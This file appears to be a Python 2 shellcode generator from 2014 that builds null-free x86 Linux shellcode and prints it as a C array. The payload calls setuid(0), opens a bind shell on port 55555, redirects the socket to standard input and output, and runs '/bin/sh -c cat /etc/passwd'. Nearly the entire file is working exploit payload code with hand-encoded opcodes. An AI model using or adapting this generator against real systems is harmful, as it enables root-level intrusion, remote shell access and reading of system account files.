from struct import pack
import sys 
import binascii

##########################################################
#
#  1.  Bind port 127.0.0.1:BIND_PORT
#  2.  Run binfile  with paramters if given
#
#	                         random	     2014-04-21
##########################################################


##########################################################
des_format = 'shellcode: bind port at 127.0.0.1:%s  && %s %s' 
BIND_IP = '127.0.0.1'
BIND_PORT = 55555
BIN_FILE = '/bin/sh'
PARAMETERS = ['-c','cat /etc/passwd']
ALIGN = 4
UID = 0
##########################################################

def out_format(language):
	if language=='c':
		des = '\n\n/*\n*  '+ des_format +'\n*/'
	elif language=='python':
		des = '\n\n#  '+ des_format +'  #'
	elif language=='perl':
		des = '\n\n#  '+ des_format +'  #'
	else:
		return 
	print des % (BIND_PORT,BIN_FILE,PARAMETERS)


#padding FilePath with  '/'  by 4 bytes aligned
def PaddingFilepath(binpath, align = ALIGN):
		newpath = ''
		sub_path =  binpath.split('/') 
		for p in sub_path:
			if len(p):
				newpath = newpath + (align - len(p) % align) * '/'  + p
		return newpath

def init_regs_shellcode():
	shellcode = ''
	#init
	shellcode += '\x31\xc0\x31\xd2\x31\xdb\x31\xc9'			#xor eax,eax#xor edx,edx#xor ebx,ebx#xor ecx,ecx
	return shellcode


def build_sockaddr_shellcode(ip, port):
	'''	
	 struct sockaddr {
				   sa_family_t sa_family;
				   char        sa_data[14];	 
			   }
	'''
	shellcode = ''
	shellcode += '\x31\xc0'													#xor eax,eax
	shellcode += '\x50'															#push eax
	shellcode += '\x50'															#push eax
	if ip == '0.0.0.0':
		shellcode += '\x50'															#push eax
	else:
		#push IP
		zero_arr = [0,0,0,0]
		ip_value = 0
		ip = ip.split('.')[::-1]
		print ip
		for i in xrange(len(ip)):
			p = int(ip[i])
			if p == 0:
				p = p + 1
				zero_arr[i] = 1
			ip_value += p <<8*(i)
		print ip_value
		#push ip
		shellcode += "\x68"															#push
		shellcode += pack('>I',(ip_value))										#ip field
		for i in xrange(len(zero_arr)):
			if zero_arr[i] == 1:
				shellcode += '\xfe\x4c\x24'	+ pack('B',(i))					#dec byte [esp+i]
	#push port
	shellcode += '\x66\x68'													#pushw
	shellcode += pack('>H',(port))											#ip field	#host order is big endian
	shellcode += '\xb0\x02'													#sa_family = AF_INET = 2
	shellcode += '\x66\x50'													#pushw  %ax
	#shellcode += '\x89\xe0'													#mov %esp,%eax
	return shellcode

def setuid_shellcode(userid):
	shellcode = ''
	shellcode += '\x31\xc0'													#xor eax,eax
	shellcode += '\x31\xdb'													#xor ebx,ebx
	if (userid <= 0):
		pass
	elif (userid <= 0xff):
		shellcode += '\xb3' + pack('B',userid)							#mov bl,UID
	elif (userid > 0xff):
		if not (userid & 0xFF):
			shellcode += '\x66\xbb' + pack('H',userid+1)			#mov bx,(UID+1)
			shellcode += '\x66\x4b'											#dec bx
		else:
			shellcode += '\x66\xbb' + pack('H',userid)				#mov bx,(UID)
	shellcode += '\xb0\x17'													#mov ax,0x17
	shellcode += '\xcd\x80'													#int 0x80  -----> setuid(UID)
	return shellcode

def exec_shellcode(binpath,parameters):

	if len(binpath) % ALIGN :
		binpath = PaddingFilepath(binpath)
	strlen = len(binpath)
	cnt = strlen / ALIGN
	shellcode = ''

	#call execve(binpath,[binpath,arg1,arg2,...],NULL)
	shellcode += '\x31\xc0'												#xor eax,eax
	shellcode += '\x31\xd2\x52'											#xor edx,edx#push edx  --->  null bytes
	#push binpath
	binpath = binpath[::-1]													#reverse str
	for i in xrange(cnt):
			#push binpath
			shellcode += '\x68'												#push opcode
			shellcode += binpath[i*ALIGN:(i+1)*ALIGN][::-1]	#reverse
	shellcode += '\x89\xe3'												#mov ebx,esp	 #ebx store  the first argv for execve		
	#build the second argv for execve
	shellcode += '\x52'														#push edx  ---> as null bytes
	cnt = len(parameters)	
	if cnt:
		shellcode += '\x83\xec'	 + pack('B',(cnt*4) + 4)		#sub esp,cnt*4
		shellcode += '\x89\xe1'											#mov ecx, esp	  ecx= esp  #ecx store  the second argv for execve	
		for i in xrange(cnt):
				p = parameters[i][::-1]
				l = len(p)
				c = l / 2
				r = l % 2
				shellcode += '\x52'											#push edx  ---> as null bytes 
				for j in xrange(c):
					shellcode += '\x66\xb8'								#mov ax
					shellcode += p[j*2:(j+1)*2][::-1]	
					shellcode += '\x66\x50'								#push ax
				if r:
					shellcode += '\x31\xc0'								#xor eax,eax
					shellcode += '\xb4' + p[l-1]							#mov ah,p[_len-1]
					shellcode += '\x66\x50'								#push ax
					shellcode += '\x44'										#inc esp
				shellcode += "\x89\xe0"									#mov eax,esp
				shellcode += '\x89\x41' + pack('B',((i+1)*4))		#mov [ecx+(i+1)*4],eax
		shellcode += '\x89\x19'											#mov [ecx],ebx
	else:
		shellcode += '\x53'													#push ebx 
		shellcode += '\x89\xe1'											#mov ecx, esp	  ecx= esp
	shellcode += '\x31\xc0'												#xor eax,eax
	shellcode += '\xb0\x0b'												#mov al,0x0b	# execve call num
	shellcode += '\xcd\x80'												#int 0x80
	#call exit()
	#shellcode += '\x31\xc0\x31\xdb\x40\xcd\x80'
	return shellcode

def bind_shellcode(bind_ip,bind_port,binpath,parameters=[]):

	if (not bind_port & 0xFF) or \
		(not bind_port>>8 & 0xFF) :
		print 'bind_port contains null bytes'
		exit(0) 

	shellcode = ''

	#sock()
	shellcode += '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6'	
	
	#bind()
	shellcode += build_sockaddr_shellcode(bind_ip, bind_port)
	shellcode += '\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb3\x02\xb0\x66\xcd\x80'

	#listen()
	shellcode += '\xb2\x0a\x52\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80'
	
	#accept()
	shellcode += '\x83\xc4\x08\x83\xec\x04\x89\xe2\x83\xec\x10\x89\xe1\x52\x51\x56\x89\xe1\x31\xdb\xb3\x05\xb0\x66\xcd\x80'

	#call dup2(sockfd,0) dup2(sockfd,1) dup2(sockfd,2)
	shellcode += '\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80'
	
	#call execve(binpath,[binpath,arg1,arg2,...],NULL)
	shellcode += exec_shellcode(binpath,parameters)
	
	#call exit()
	#shellcode += '\x31\xc0\x31\xdb\x40\xcd\x80'
	
	return shellcode

def getshellcode(language, shellcode):
	new_shellcode = ''
	if language == 'bin':
			new_shellcode = shellcode
			sys.stdout.write(new_shellcode)
	if language == 'c':
			sys.stdout.write("\nchar shellcode[] = \\\n\"")
			for i in xrange(len(shellcode)):
				tmp =  '\\'+ str(hex(ord(shellcode[i])))[1:]  
				new_shellcode += tmp
				sys.stdout.write(tmp)
				if   not (i+1) % 16 :
					sys.stdout.write("\"\n\"")
			sys.stdout.write("\";\n\n\n")
	if language == 'perl':
			pass
	if language == 'python':
			pass	

if __name__ == '__main__':

	#language = 'bin'
	language = 'c'
	shellcode = ''
	shellcode += init_regs_shellcode()
	shellcode += setuid_shellcode(UID)
	shellcode += bind_shellcode(bind_ip=BIND_IP, bind_port=BIND_PORT, binpath=BIN_FILE, parameters=PARAMETERS)
	out_format(language)
	getshellcode(language, shellcode)
	



